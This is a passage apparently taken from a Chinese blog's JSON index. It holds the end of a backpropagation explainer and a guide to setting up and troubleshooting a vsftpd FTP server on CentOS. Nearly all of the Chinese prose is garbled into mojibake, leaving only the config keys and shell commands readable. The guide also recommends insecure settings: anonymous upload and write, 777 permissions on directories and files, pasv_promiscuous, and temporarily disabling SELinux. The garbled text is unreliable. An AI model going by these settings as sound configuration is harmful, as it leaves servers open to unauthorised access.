Backpropagationç®—æ³•è¯¥ç®—æ³•å¯ä»¥è¯´æ˜¯å…¶ä»–ç¥ç»ç½‘ç»œç®—æ³•çš„åŸºæœ¬ï¼Œé€šè¿‡è¿­ä»£æ€§çš„è®­ç»ƒé›†è¾“å…¥æ¥å¤„ç†è®­ç»ƒé›†ä¸­çš„å®ä¾‹ï¼Œå¯¹æ¯”é€šè¿‡ç¥ç»ç½‘ç»œå¤„ç†åè¾“å‡ºå±‚çš„é¢„æµ‹å€¼ä¸è®­ç»ƒé›†çœŸå®å€¼ä¹‹é—´çš„å·®ï¼Œæ¥åå‘åœ°ä»¥æœ€å°åŒ–è¯¯å·®è°ƒèŠ‚æ¯ä¸ªè¿æ¥ä¹‹é—´çš„æƒé‡ï¼Œä»¥æ­¤æ–¹å¼é€æ¸åœ°è¿›è¡Œè®­ç»ƒã€‚ ç®—æ³•çš„è¦ç´ å¦‚ä¸‹ï¼š è¾“å…¥ï¼šæ•°æ®é›†Dã€å­¦ä¹ ç‡Lã€ä¸€ä¸ªå¤šå±‚å‘å‰ç¥ç»ç½‘ç»œè¾“å‡ºï¼šä¸€ä¸ªè®­ç»ƒå¥½çš„ç¥ç»ç½‘ç»œèµ·å§‹çŠ¶æ€æ—¶éœ€è¦åˆå§‹åŒ–æƒé‡ã€åå‘ï¼ˆBiasï¼Œæ¯ä¸ªå•å…ƒéƒ½æœ‰ä¸€ä¸ªåå‘ï¼Œç›¸å½“äºä¸Šå±‚ä¼ åˆ°å½“å‰ç»“ç‚¹çš„ä¸€ä¸ªåç§»ï¼‰ï¼šéšæœºåˆå§‹åŒ–å€¼åœ¨-1åˆ°1ä¹‹é—´ï¼Œæˆ–è€…-0.5åˆ°0.5ä¹‹é—´ã€‚ å¯¹äºä¸€ä¸ªè®­ç»ƒå®ä¾‹ï¼Œæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š 1ã€ç”±è¾“å…¥å±‚å‘å‰ä¼ é€ï¼Œä¼ é€æ—¶éœ€è¦å¯¹æ¯ä¸ªå•å…ƒè¿›è¡ŒåŠ æƒï¼Œç„¶ååŠ ä¸Šä¼ å…¥åˆ°çš„ç›®æ ‡ç»“ç‚¹çš„åå‘å€¼ï¼Œæœ€åå¯¹åŠ æƒå€¼è¿›è¡Œéçº¿æ€§çš„è½¬åŒ–ï¼Œç„¶åä¼ é€ç»™ä¸‹å±‚ç»“ç‚¹ã€‚å¦‚ä¸‹å›¾ï¼š 2ã€æ ¹æ®è¯¯å·®è¿›è¡Œåå‘ä¼ é€ 3ã€æŒ‰ç…§ä¸Šè¿°ä¸¤æ­¥ï¼Œè¾“å‡ºè®­ç»ƒé›†ä¸åŒçš„æ•°æ®è¿›è¡Œå¤šæ¬¡çš„å‘å‰ä¼ é€å’Œåå‘ä¼ é€è¿›è¡Œæ›´æ–°ï¼Œç»ˆæ­¢æ¡ä»¶ï¼š æƒé‡çš„æ›´æ–°ä½äºæŸä¸ªé˜ˆå€¼ é¢„æµ‹çš„é”™è¯¯ç‡ä½äºæŸä¸ªé˜ˆå€¼ è¾¾åˆ°é¢„è®¾ä¸€å®šçš„å¾ªç¯æ¬¡æ•° éçº¿æ€§è½¬åŒ–æ–¹ç¨‹sigmoidå‡½æ•°ï¼ˆSæ›²çº¿ï¼‰ç”¨æ¥ä½œä¸ºè½¬åŒ–æ–¹ç¨‹ï¼Œsigmoidå‡½æ•°æ›²çº¿å½¢å¦‚ä¸‹å›¾ï¼š é€šå¸¸æœ‰ä¸¤ç§ï¼šåŒæ›²å‡½æ•°å’Œé€»è¾‘å‡½æ•° å…³äºæœºå™¨å­¦ä¹ çš„çŸ¥è¯†å¾ˆå¤šï¼Œæˆ‘ä¸»è¦å­¦ä¹ ä¸€äº›ç¥ç»ç½‘ç»œçš„ä¸œè¥¿ï¼Œåé¢ä¼šç»§ç»­è®°å½•ã€‚","link":"/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"},{"title":"FTPæœåŠ¡å™¨æ­å»ºåŠå…¸å‹é—®é¢˜çš„è§£å†³","text":"SSHç®¡ç†è¿œç¨‹LinuxæœåŠ¡å™¨å°‘ä¸äº†æ–‡ä»¶çš„ä¼ è¾“ï¼Œè™½ç„¶lrzszèƒ½å¤Ÿè§£å†³æœ¬åœ°ä¸è¿œç¨‹æœåŠ¡å™¨ä¹‹é—´æ–‡ä»¶ä¼ è¾“çš„é—®é¢˜ï¼Œä½¿ç”¨sz/rzå³å¯ï¼Œæ¯”å¦‚ï¼š sz filename #å‘é€ä¸€ä¸ªæ–‡ä»¶åˆ°æœ¬åœ°sz filename1 filename2 #å‘é€å¤šä¸ªæ–‡ä»¶åˆ°æœ¬åœ°sz dir/* #å‘é€dirç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¸åŒ…å«dirä¸‹çš„æ–‡ä»¶å¤¹ ä»æœ¬åœ°ä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨åœ¨ç»ˆç«¯è¾“å…¥rzå³å¯ã€‚å‚è€ƒè¿™é‡Œã€‚ ä½†æ˜¯lrzszå¤„ç†å°æ–‡ä»¶å¯ä»¥ï¼Œå¤„ç†å¤§æ–‡ä»¶æ•ˆæœå°±ä¸å¤ªå¥½ï¼Œå› æ­¤ï¼Œå¯ä»¥é€‰æ‹©å¦ä¸€ç§æ–¹å¼ï¼Œæ²¡é”™ï¼Œæ­å»ºä¸€ä¸ªFTPæœåŠ¡å™¨ã€‚è€Œä¸”FTPæœåŠ¡å™¨èƒ½æ”¯æŒå¤šäººå¯¹æ–‡ä»¶çš„å…±äº«ã€‚ æ­å»ºFTPæœåŠ¡å™¨æˆ‘çš„æœåŠ¡å™¨æ˜¯CentOSçš„ï¼Œå› æ­¤ä¸‹é¢çš„é…ç½®ä»¥CentOSä¸‹çš„é…ç½®ä¸ºä¾‹ï¼Œä¸è¿‡å…¶ä»–Linuxç³»ç»Ÿå¤§åŒå°å¼‚ï¼Œæ ¹æ®ä¸ªäººæƒ…å†µé…ç½®å³å¯ã€‚ å®‰è£…vsftpdLinuxä¸‹è½»ä¾¿çš„çš„ftpç¨‹åºåº”è¯¥å°±æ˜¯vsftpdäº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥yumå®‰è£…ï¼š yum install -y vsftpd é…ç½®vsftpdvsftpdçš„é…ç½®ç›®å½•ä¸º/etc/vsftpdï¼ŒåŒ…å«ä¸‹åˆ—çš„é…ç½®æ–‡ä»¶ï¼š vsftpd.confä¸ºä¸»è¦é…ç½®æ–‡ä»¶ ftpusersé…ç½®ç¦æ­¢è®¿é—® FTP æœåŠ¡å™¨çš„ç”¨æˆ·åˆ—è¡¨ user_listé…ç½®ç”¨æˆ·è®¿é—®æ§åˆ¶ è¿™é‡Œæˆ‘ä»¬ä¸»è¦å¯¹vsftpd.confè¿›è¡Œé…ç½®ï¼Œè¿™é‡Œå¯ä»¥å…ˆç”¨ä¸‹é¢è¿™æ¡å‘½ä»¤çœ‹åˆå§‹çš„é…ç½®æœ‰å“ªäº›ï¼š cat /etc/vsftpd/vsftpd.conf | grep -v \"#\" | more å„é¡¹é…ç½®çš„è§„åˆ™å¦‚ä¸‹ï¼š # å¼€å¯åŒ¿åç™»å½•anonymous_enable=YES# å…è®¸ä½¿ç”¨æœ¬åœ°å¸æˆ·è¿›è¡ŒFTPç”¨æˆ·ç™»å½•éªŒè¯local_enable=YES# å…è®¸å†™write_enable=YES# è®¾ç½®æœ¬åœ°ç”¨æˆ·é»˜è®¤æ–‡ä»¶æ©ç 022local_umask=022# å…è®¸åŒ¿åä¸Šä¼ anon_upload_enable=YES# å…è®¸åŒ¿ååˆ›å»ºæ–°ç›®å½•anon_mkdir_write_enable=YES# åŒæ—¶å¼€æ”¾å…¶å®ƒæƒé™anon_other_write_enable=YES# å¯ä»¥å‘é€æ¶ˆæ¯å½“è®¿é—®æŸä¸ªç›®å½•æ—¶dirmessage_enable=YES# å¼€å¯ä¸Šä¼ ä¸‹è½½è®°å½•xferlog_enable=YES# æ•°æ®é“¾é€šè¿‡20ç«¯å£å»ºç«‹connect_from_port_20=YES# å…è®¸å…¶å®ƒç”¨æˆ·ä¸Šä¼ åŒ¿åæ–‡ä»¶#chown_uploads=YES# æ‰€æœ‰ç”¨æˆ·#chown_username=whoever# æ—¥å¿—ä¿å­˜åˆ°#xferlog_file=/var/log/xferlog# æ—¥å¿—æ ‡å‡†è¾“å‡ºxferlog_std_format=YES# ç©ºé—²ä¼šè¯æ—¶é—´#idle_session_timeout=600# æ•°æ®è¿æ¥è¶…æ—¶æ—¶é—´#data_connection_timeout=120# éš”ç¦»çš„å®‰å…¨ç”¨æˆ·#nopriv_user=ftpsecure# å¼€å¯å¼‚æ­¥æ•°æ®çº¿ç¨‹#async_abor_enable=YES# å¼€å¯ASCIIåè®®ä¸Šä¼ ascii_upload_enable=YES# å¼€å¯ASCIIåè®®ä¸‹è½½ascii_download_enable=YES# å¼€å¯é‚®ç®±éªŒè¯#deny_email_enable=YES# æ‹’ç»çš„é‚®ç®±åˆ—è¡¨#banned_email_file=/etc/vsftpd/banned_emails# æ˜¯å¦å…è®¸ç›´æ¥è·å–å­ç›®å½•ä¿¡æ¯#ls_recurse_enable=YES# ç›‘å¬IPv4listen=NO# ç›‘å¬IPv6å’Œç›‘å¬IPv4listen_ipv6=YES# è™šæ‹Ÿç”¨æˆ·å¯ç”¨pamè®¤è¯pam_service_name=vsftpd# ç”¨æˆ·ç»„ç®¡ç†userlist_enable=YES# è®¿é—®æ§åˆ¶tcp_wrappers=YES# å…ä½¿ç”¨è¢«åŠ¨æ¨¡å¼pasv_enable=YES# æŒ‡å®šä½¿ç”¨è¢«åŠ¨æ¨¡å¼æ—¶æ‰“å¼€ç«¯å£çš„æœ€å°å€¼pasv_min_port=10060# æŒ‡å®šä½¿ç”¨è¢«åŠ¨æ¨¡å¼æ—¶æ‰“å¼€ç«¯å£çš„æœ€å¤§å€¼ã€‚pasv_max_port=10090# ç”¨æˆ·å®½å¸¦é™åˆ¶200kps#local_max_rate=200000# ç™»å½•åæ¬¢è¿å†…å®¹ftpd_banner=Welcome to My FTP service.# ---------å¼€å¯è™šæ‹Ÿç”¨æˆ·ç»„å‚æ•°--------# å¼€å¯è™šæ‹Ÿç”¨æˆ·guest_enable=YES# ä¸»è™šæ‹Ÿç”¨æˆ·åvsftpdï¼Œç­‰ä¸‹ä¼šå»ºç«‹guest_username=vsftpd# è™šæ‹Ÿç”¨æˆ·é…ç½®ï¼ˆå¯ä»¥å¯¹æ¯ä¸€ä¸ªè™šæ‹Ÿç”¨æˆ·è¿›è¡Œå•ç‹¬çš„æƒé™é…ç½®ï¼‰user_config_dir=/etc/vsftpd/vconf# å¯ç”¨é™å®šç”¨æˆ·åœ¨å…¶ä¸»ç›®å½•ä¸‹chroot_local_user=YES# å¼€å¯ç”¨æˆ·åˆ—è¡¨chrootç®¡ç†chroot_list_enable=YES# chrootç®¡ç†çš„ç”¨æˆ·åˆ—è¡¨ï¼ˆä¸€è¡Œä¸€ç”¨æˆ·,è™šæ‹Ÿç”¨æˆ·éƒ½è¦æ·»åŠ è¿›å»ï¼‰# å½“è®¾ç½®ç”¨æˆ·åªèƒ½åœ¨ç™»å½•ç›®å½•æ—¶ï¼Œchrootç®¡ç†çš„ç”¨æˆ·ä¸ºä¸å—é™åˆ¶ï¼Œå¦åˆ™ç›¸åchroot_list_file=/etc/vsftpd/chroot_list# å…è®¸chrootç®¡ç†ç”¨æˆ·è¿›è¡Œå†™æ“ä½œallow_writeable_chroot=YES# ---------è™šæ‹Ÿç”¨æˆ·é«˜çº§å‚æ•°ï¼ˆè¯·é€‰æ‹©ä¸€ç»„ï¼‰--------# è™šæ‹Ÿç”¨æˆ·å’Œæœ¬åœ°ç”¨æˆ·æœ‰ç›¸åŒçš„æƒé™virtual_use_local_privs=YES# è™šæ‹Ÿç”¨æˆ·å’ŒåŒ¿åç”¨æˆ·æœ‰ç›¸åŒçš„æƒé™ï¼Œé»˜è®¤æ˜¯NOvirtual_use_local_privs=NO# è™šæ‹Ÿç”¨æˆ·å…·æœ‰å†™æƒé™ï¼ˆä¸Šä¼ ã€ä¸‹è½½ã€åˆ é™¤ã€é‡å‘½åï¼‰virtual_use_local_privs=YESwrite_enable=YES# è™šæ‹Ÿç”¨æˆ·ä¸èƒ½æµè§ˆç›®å½•ï¼Œåªèƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=YESanon_upload_enable=YES# è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸‹è½½æ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_upload_enable=NO# è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_upload_enable=YES# è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸‹è½½æ–‡ä»¶å’Œåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œæ— å…¶ä»–æƒé™virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_mkdir_write_enable=YES# è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸‹è½½ã€åˆ é™¤å’Œé‡å‘½åæ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_other_write_enable=YES è€Œæˆ‘ä»¬ä¸ä¸€å®šæ¯é¡¹éƒ½è¿›è¡Œé…ç½®ï¼Œåœ¨åˆå§‹çš„åŸºç¡€ä¹‹ä¸Šï¼Œè¿›è¡Œå¦‚ä¸‹é…ç½®å³å¯ï¼š # ä¸Šé¢å·²ç»ç»™äº†å…¨éƒ¨é…ç½®çš„å«ä¹‰ï¼Œè‡ªå·±æ¯”å¯¹å³å¯anonymous_enable=NOpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YESallow_writeable_chroot=YESlocal_root=/data/ftp/ #ç»™ftpè´¦æˆ·æŒ‡å®šä¸»ç›®å½•listen_port=60021 #è¿™é‡Œä¹Ÿå¯ä»¥ä¸è®¾ç½®ï¼Œé»˜è®¤ftpæ˜¯21ç«¯å£ é…ç½®å®Œä¹‹åä¿å­˜ï¼Œç„¶åé‡å¯vsftpdã€‚ åˆ›å»ºFTPç”¨æˆ·é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°è´¦æˆ·ftpuserï¼š useradd ftpuser ç„¶åä¸ºå…¶è®¾ç½®å¯†ç ï¼š passwd ftpuser ç°åœ¨è¿™ä¸ªè´¦æˆ·å…¶å®æ˜¯ä¸€ä¸ªå¯ç™»å½•çš„Linuxç”¨æˆ·ï¼Œä¸ºäº†å®‰å…¨ï¼Œæˆ‘ä»¬è¦é™åˆ¶ç”¨æˆ·çš„æƒé™ï¼Œä¸èƒ½è®©å…¶ç™»å½•linuxè€Œåªèƒ½ç”¨äºç™»å½•FTPæœåŠ¡å™¨ï¼š usermod -s /sbin/nologin ftpuser æŒ‡å®šä¸»ç›®å½•å‰é¢é…ç½®æ–‡ä»¶é‡Œçœ‹åˆ°äº†æˆ‘ä»¬ä¸ºftpç”¨æˆ·æŒ‡å®šäº†ä¸»ç›®å½•/data/ftpï¼Œä½†æ˜¯åˆå§‹æƒ…å†µè¯¥ç›®å½•å¯èƒ½ä¸å­˜åœ¨ï¼Œéœ€è¦æ–°å»ºæ–‡ä»¶ç›®å½•ï¼š chmod a-w /data/ftp &amp;&amp; chmod 777 -R /data/ftp/pub è¿™é‡ŒåŒæ—¶ä¹Ÿä¸ºç›®å½•è®¾ç½®äº†æƒé™ï¼Œå¯ä»¥çœ‹åˆ°pubç›®å½•æ˜¯777æƒé™ï¼Œæ–‡ä»¶çš„ä¸Šä¼ ã€ä¸‹è½½ä¹Ÿå°±åœ¨æ­¤ç›®å½•ä¹‹ä¸‹äº†ã€‚ ç„¶åè®¾ç½®ä¸ºç”¨æˆ·ä¸»ç›®å½•ï¼š usermod -d /data/ftp ftpuser é˜²ç«å¢™è®¾ç½®å‰é¢çš„listen_portå¦‚æœæ›´æ”¹çš„è¯ï¼Œä¹Ÿè¦åœ¨é˜²ç«å¢™æ¥å¼€æ”¾å…¶ç«¯å£ï¼š firewall-cmd --zone=public --add-port=60021/tcp --permanent ç„¶åé‡å¯é˜²ç«å¢™ï¼š firewall-cmd --reload è‡³æ­¤ï¼ŒåŸºç¡€çš„é…ç½®ä¹Ÿå°±å®Œæ¯•äº†ï¼Œä¸‹é¢è¿›è¡Œæµ‹è¯•ã€‚ æµ‹è¯•æœåŠ¡å™¨åŠé—®é¢˜å‘ç°è¿æ¥FTPæœåŠ¡å™¨å¯ä»¥é€‰ç”¨ä¸€äº›FTPå®¢æˆ·ç«¯è½¯ä»¶ï¼šFileZilla Clientã€CuteFTPç­‰å¾ˆå¤šï¼Œæˆ‘ç”¨äº†FileZilla Clientè¿›è¡Œæµ‹è¯•ã€‚ è¿™é‡Œç”±äºFTPçš„è¿æ¥æœ‰ä¸¤ç§æ¨¡å¼ï¼šä¸»åŠ¨ï¼ˆPOSTï¼‰å’Œè¢«åŠ¨ï¼ˆPASVï¼‰ä¸¤ç§æ¨¡å¼ï¼š POSTæ¨¡å¼ï¼šå½“å®¢æˆ·ç«¯Cå‘æœåŠ¡ç«¯Sè¿æ¥åï¼Œä½¿ç”¨çš„æ˜¯Portæ¨¡å¼,é‚£ä¹ˆå®¢æˆ·ç«¯Cä¼šå‘é€ä¸€æ¡å‘½ä»¤å‘Šè¯‰æœåŠ¡ç«¯S(å®¢æˆ·ç«¯Cåœ¨æœ¬åœ°æ‰“å¼€äº†ä¸€ä¸ªç«¯å£Nåœ¨ç­‰ç€ä½ è¿›è¡Œæ•°æ®è¿æ¥),å½“æœåŠ¡ç«¯Sæ”¶åˆ°è¿™ä¸ªPortå‘½ä»¤å å°±ä¼šå‘å®¢æˆ·ç«¯æ‰“å¼€çš„é‚£ä¸ªç«¯å£Nè¿›è¡Œè¿æ¥ï¼Œè¿™ç§æ•°æ®è¿æ¥å°±ç”Ÿæˆäº†ã€‚ PASVæ¨¡å¼ï¼šå½“å®¢æˆ·ç«¯Cå‘æœåŠ¡ç«¯Sè¿æ¥åï¼Œä½¿ç”¨çš„æ˜¯Portæ¨¡å¼,é‚£ä¹ˆå®¢æˆ·ç«¯Cä¼šå‘é€ä¸€æ¡å‘½ä»¤å‘Šè¯‰æœåŠ¡ç«¯S(å®¢æˆ·ç«¯Cåœ¨æœ¬åœ°æ‰“å¼€äº†ä¸€ä¸ªç«¯å£Nåœ¨ç­‰ç€ä½ è¿›è¡Œæ•°æ®è¿æ¥),å½“æœåŠ¡ç«¯Sæ”¶åˆ°è¿™ä¸ªPortå‘½ä»¤å å°±ä¼šå‘å®¢æˆ·ç«¯æ‰“å¼€çš„é‚£ä¸ªç«¯å£Nè¿›è¡Œè¿æ¥ï¼Œè¿™ç§æ•°æ®è¿æ¥å°±ç”Ÿæˆäº†ã€‚ æŒ‰ç…§å‰é¢çš„åŸºç¡€é…ç½®åœ¨æµ‹è¯•æ—¶å‘ç°ä¸»åŠ¨å’Œè¢«åŠ¨æ¨¡å¼ç™»å½•éƒ½å­˜åœ¨é—®é¢˜ ä¸»åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜é¦–æ¬¡è¿æ¥å‘ç°å¯ä»¥ç™»å½•ï¼Œä½†æ˜¯è¯»å–ç›®å½•åˆ—è¡¨å¤±è´¥ï¼ŒæŠ¥é”™æƒ…å†µå¦‚ä¸‹ï¼š æ ¹æ®æŠ¥é”™æç¤ºï¼š çŠ¶æ€: å·²ç™»å½•çŠ¶æ€: è¯»å–ç›®å½•åˆ—è¡¨...å‘½ä»¤: PWDå“åº”: 257 &quot;/data/ftp&quot;å‘½ä»¤: TYPE Iå“åº”: 200 Switching to Binary mode.å‘½ä»¤: PORT xx,xx,xx,xx,216,94å“åº”: 500 Illegal PORT command.å‘½ä»¤: PASVå“åº”: 227 Entering Passive Mode (xx,xx,xx,xx,227,27).å‘½ä»¤: LISTé”™è¯¯: 20 ç§’åæ— æ´»åŠ¨ï¼Œè¿æ¥è¶…æ—¶é”™è¯¯: è¯»å–ç›®å½•åˆ—è¡¨å¤±è´¥ æ ¹æ®æŠ¥é”™æ—¥å¿—ï¼Œä¸éš¾ç†è§£ï¼Œå½“æˆåŠŸç™»å½•ä¹‹åï¼Œè¿›è¡Œç›®å½•è¯»å–ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ•°æ®ä¼ è¾“çš„æ—¶å€™ï¼Œå› ä¸ºæ˜¯ä¸»åŠ¨æ¨¡å¼ï¼ŒæœåŠ¡å™¨ä¼šä¸»åŠ¨å‘å®¢æˆ·ç«¯è¿™è¾¹è¿›è¡Œè¿æ¥ï¼Œå³å‘21694ç«¯å£è¿›è¡Œè¿æ¥ï¼Œç„¶åå°±æŠ¥é”™äº†ï¼Œæ ¹æœ¬åŸå› åº”è¯¥å°±æ˜¯å®¢æˆ·ç«¯æœºå™¨çš„é˜²ç«å¢™å¯¹è¯¥ç«¯å£å¹¶æ²¡æœ‰å¼€æ”¾ï¼Œå› æ­¤è¿æ¥è‚¯å®šæ˜¯å¤±è´¥çš„ã€‚ç„¶ååˆé‡‡ç”¨äº†è¢«åŠ¨æ¨¡å¼è¿›è¡Œè¿æ¥ï¼Œå³æœåŠ¡å™¨å¼€æ”¾22727ç«¯å£ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ï¼Œç„¶è€Œè¿˜æ˜¯å¤±è´¥äº†ï¼ŒåŸå› ä½•åœ¨å‘¢ï¼Ÿ ç”±äºä¸€äº›å®¢è§‚åŸå› ï¼Œæˆ‘æ²¡æœ‰å¯¹è‡ªå·±çš„å®¢æˆ·æœºçš„é˜²ç«å¢™è¿›è¡Œæ›´æ”¹ï¼Œè€Œæ˜¯æ¢ç”¨è¢«åŠ¨æ¨¡å¼ï¼Œå½“ç„¶ï¼Œä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ã€‚ è¢«åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜é‡‡ç”¨è¢«åŠ¨è¿æ¥çš„æ–¹å¼ï¼Œé¦–å…ˆéœ€è¦åœ¨vsftpd.confä¸‹è¿›è¡Œå¦‚ä¸‹é…ç½®ï¼š pasv_enable=YES #å¼€å¯è¢«åŠ¨æ¨¡å¼pasv_min_port=44550 #æŒ‡å®šè¢«åŠ¨æ¨¡å¼æœ€å°ç«¯å£pasv_max_port=44551 #æŒ‡å®šè¢«åŠ¨æ¨¡å¼æœ€å¤§ç«¯å£pasv_promiscuous=YES #å…³é—­è¢«åŠ¨æ¨¡å¼çš„å®‰å…¨æ£€æŸ¥(è¿™ä¸ªæ£€æŸ¥å¯ä»¥ç¡®ä¿æ•°æ®è¿æ¥æºäºåŒä¸€IPåœ°å€) é‡å¯vsftpdæœåŠ¡ æ”¯æŒäº†è¢«åŠ¨æ¨¡å¼ï¼Œå¹¶ä¸”æŒ‡å®šäº†ç«¯å£å¼€æ”¾èŒƒå›´ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨é˜²ç«å¢™è¿›è¡Œç«¯å£çš„é…ç½®å³å¯ã€‚ é‡å¯é˜²ç«å¢™ï¼Œç„¶åå†æ¬¡æµ‹è¯•ï¼š å¯ä»¥çœ‹åˆ°ç›®å½•æˆåŠŸåˆ—ä¸¾äº†ï¼Œé—®é¢˜å¾—åˆ°è§£å†³ã€‚ ä¸Šä¼ æ–‡ä»¶å¤±è´¥çš„é—®é¢˜å½“èƒ½æˆåŠŸç™»å½•ã€æˆåŠŸåˆ—ä¸¾ç›®å½•äº†ä¹‹åï¼Œæœ€ä¸»è¦çš„ç›®çš„å½“ç„¶æ˜¯æ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½äº†ï¼Œç„¶åå½“å»æµ‹è¯•çš„æ—¶å€™ï¼Œåˆå‡ºç°äº†é—®é¢˜ï¼š æŠ¥é”™ï¼š553 Could not create file. æœ¬æ¥æƒ³ç€å¾ˆç®€å•ï¼Œåº”è¯¥æ˜¯æ–‡ä»¶å¤¹æƒé™çš„é—®é¢˜ï¼Œä½†æ˜¯å¯¹æ–‡ä»¶å¤¹æ”¹äº†777ï¼Œç”šè‡³/dataéƒ½æ”¹æˆ777äº†è¿˜æ˜¯ä¸è¡Œï¼Œåæ¥æŸ¥èµ„æ–™ï¼Œç½‘ä¸Šè¯´å¯èƒ½æ˜¯SELinuxçš„é—®é¢˜ï¼Œè¿™æ˜¯ä¸ªä»€ä¹ˆå‘¢ï¼Ÿ SELinux(Security-Enhanced Linux) æ˜¯ç¾å›½å›½å®¶å®‰å…¨å±€ï¼ˆNSAï¼‰å¯¹äºå¼ºåˆ¶è®¿é—®æ§åˆ¶çš„å®ç°ï¼Œæ˜¯ Linuxå†å²ä¸Šæœ€æ°å‡ºçš„æ–°å®‰å…¨å­ç³»ç»Ÿã€‚NSAæ˜¯åœ¨Linuxç¤¾åŒºçš„å¸®åŠ©ä¸‹å¼€å‘äº†ä¸€ç§è®¿é—®æ§åˆ¶ä½“ç³»ï¼Œåœ¨è¿™ç§è®¿é—®æ§åˆ¶ä½“ç³»çš„é™åˆ¶ä¸‹ï¼Œè¿›ç¨‹åªèƒ½è®¿é—®é‚£äº›åœ¨ä»–çš„ä»»åŠ¡ä¸­æ‰€éœ€è¦æ–‡ä»¶ã€‚ â€“ç™¾ç§‘ SELinux ä¸»è¦ä½œç”¨å°±æ˜¯æœ€å¤§é™åº¦åœ°å‡å°ç³»ç»Ÿä¸­æœåŠ¡è¿›ç¨‹å¯è®¿é—®çš„èµ„æºï¼ˆæœ€å°æƒé™åŸåˆ™ï¼‰ã€‚ è¿™é‡Œæœ‰ä¸€ç¯‡ä¸é”™çš„æ–‡ç« å¯ä»¥å‚è€ƒã€‚ é‚£ä¹ˆæˆ‘ä»¬å…³é—­SELinuxè¯•è¯•ï¼šsetenforce 0ï¼Œç„¶åæµ‹è¯•ä¸€ä¸‹çœ‹çœ‹ï¼š æœç„¶æˆäº†ï¼Œé‚£å°±æ˜¯å®ƒçš„é—®é¢˜äº†ï¼Œä¸‹é¢å°±å¯¹å…¶è¿›è¡Œé…ç½®å…ˆçœ‹ä¸€ä¸‹æƒé™ï¼šgetsebool -a | grep ftpd # ç½‘ä¸Šæ˜¯è¿™æ ·çš„allow_ftpd_anon_write --&gt; offallow_ftpd_full_access --&gt; offallow_ftpd_use_cifs --&gt; offallow_ftpd_use_nfs --&gt; offftpd_connect_db --&gt; offftpd_use_passive_mode --&gt; offftp_home_dir --&gt; off# ä½†æ˜¯æˆ‘çš„æœåŠ¡å™¨æ˜¯è¿™æ ·çš„ftpd_anon_write --&gt; offftpd_connect_all_unreserved --&gt; offftpd_connect_db --&gt; offftpd_full_access --&gt; offftpd_use_cifs --&gt; offftpd_use_fusefs --&gt; offftpd_use_nfs --&gt; offftpd_use_passive_mode --&gt; off ç³»ç»Ÿä¹‹é—´çš„å·®å¼‚ï¼Œæ²¡åŠæ³•ï¼Œä½†æ˜¯è§£å†³æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œå‘½ä»¤è¡Œæ‰§è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤ï¼š setsebool -P ftp_home_dir 1 #è¿™ä¸€æ¡å‘½ä»¤æˆ‘çš„æœåŠ¡å™¨ä¸Šæ²¡æ‰§è¡ŒæˆåŠŸsetsebool -P allow_ftpd_full_access 1 ç„¶åå†å¼€å¯SELinuxï¼šsetenforce 1 å†æ¬¡è¿›è¡Œæµ‹è¯•ï¼š å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸä¸Šä¼ æ–‡ä»¶ï¼Œé—®é¢˜è§£å†³ã€‚ ä¸‹è½½æ–‡ä»¶å¤±è´¥çš„é—®é¢˜å°è¯•ä»æœåŠ¡å™¨ä¸Šä¸‹è½½æ–‡ä»¶æ—¶ï¼Œåˆerroräº†â€¦ å¯ä»¥çœ‹åˆ°ï¼Œä¸‹è½½æ–‡ä»¶æ—¶æŠ¥é”™ï¼š550 Failed to open file.è¿™æ¬¡é—®é¢˜å…¶å®ä¸å¤æ‚ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯æ–‡ä»¶æƒé™çš„é—®é¢˜ï¼Œçœ‹ä¸€ä¸‹ï¼šå¯ä»¥çœ‹åˆ°test.capæ–‡ä»¶æ˜¯å±äºrootç”¨æˆ·ç»„çš„ï¼Œå¹¶ä¸”æƒé™å¾ˆå°ï¼Œä½ ä¸€ä¸ªftpuserç”¨æˆ·å»æ“ä½œå®ƒè‚¯å®šæ²¡æƒé™ï¼Œé‚£ç®€å•ï¼Œæ”¹ä¸€ä¸‹ä¸å°±å¥½äº†ï¼šchmod -R 777 test.capï¼Œå†è¯•è¯•ï¼š è¯è¯´å›æ¥ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€è¦ï¼Œè¿˜æ˜¯ç”¨lrzszæ–¹ä¾¿â€¦æœ€åï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚ å‚è€ƒï¼šåŸºäºCentOSæ­å»ºFTPæ–‡ä»¶æœåŠ¡CentOS7å®‰è£…FTPæœåŠ¡å™¨553 Could not create 